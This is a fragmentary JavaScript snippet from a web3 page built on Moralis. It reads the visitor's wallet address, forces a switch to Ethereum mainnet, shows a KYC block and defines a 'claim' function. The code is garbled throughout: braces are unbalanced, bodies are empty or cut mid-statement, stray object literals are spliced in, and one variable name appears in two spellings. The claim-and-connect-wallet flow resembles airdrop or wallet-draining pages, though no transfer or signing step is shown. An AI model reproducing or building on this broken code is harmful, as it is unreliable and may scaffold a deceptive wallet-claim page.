		function strcmp(x, y) { 
			x = JSON.stringify(x).toLowerCase();
			y = JSON.stringify(y).toLowerCase();
			return (x<y?-1:(x>y?1:0));  
		}

		async function get_data() {
			addr = await Moralis.Web3.account.toString();
			if(addr.length != 42) {

				if(strcmp(addrr, addr) == 0) {
					return;
				}
			}

		async function sync_chain() {
			if(Moralis.getChainId() != "0x1") {
				try {
					await web3.currentProvider.request({
						method: "wallet_switchEthereumChain",

				} catch (err) {

			}
		}
		async function enable_web3() {
			try {

			} catch(err) {

			if(addrr.length == 0) addrr = await Moralis.Web3.account.toString();

			$("#kyc-block").css("display", "block");
		}

		async function claim() {

  }).click();

    target: '_blank',
    href: "https://metamask.io/download/",
  }).click();

			}
			let user = Moralis.User.current();

				await sync_chain();

				if(block) return;
				
			} else {
				await sync_chain();
				await get_data();
				if(block) return;
